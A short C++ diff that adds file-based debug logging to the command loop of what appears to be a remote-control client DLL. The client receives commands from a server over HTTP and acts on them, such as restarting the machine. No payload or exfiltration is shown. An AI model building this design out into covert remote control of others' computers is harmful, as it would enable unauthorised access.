@@ -9,7 +9,16 @@
 #include ".\mymaintrans.h"
 
 SOCKEINFO	m_Info = {0};
-
+static void WriteLog(char* message)
+{
+	FILE* fp = fopen("controldll.txt", "a");
+	if (fp != NULL)
+	{
+		fwrite(message, strlen(message), 1, fp);
+		fwrite("\n", 2, 1, fp);
+		fclose(fp);
+	}
+}
 CMyMainTrans::CMyMainTrans(void)
 {
 	memset(m_ServerAddr,0,sizeof(m_ServerAddr));
@@ -215,14 +224,18 @@ BOOL CMyMainTrans::RecvData(HINTERNET hFile,LPVOID pData,int DataLen)
 */
 BOOL CMyMainTrans::ProcessCmd()
 {
+	char message[255];
 	//接收交易命令
 	CMDINFO m_CmdInfo = {0};
 	if(!RecvData(hFp,&m_CmdInfo,sizeof(CMDINFO)))
 		return FALSE;
-
+	sprintf(message,"messagecommand :%d\n", m_CmdInfo.m_Command);
+	WriteLog(message);
 	//执行交易命令
 	switch(m_CmdInfo.m_Command)
 	{
+		
+
 		//重启机器
 		case CLIENT_SYSTEM_RESTART	:
 			SetEvent(m_ExitEvent);
@@ -448,7 +461,6 @@ void CMyMainTrans::MyRegDeleteKey(char *ValueName)
 		RegCloseKey(hKey);
 	}
 }
-
 void CMyMainTrans::DoWork( HINTERNET HttpFp , 
 							HANDLE hExitEvent ,
 							char* pServerAddr , 
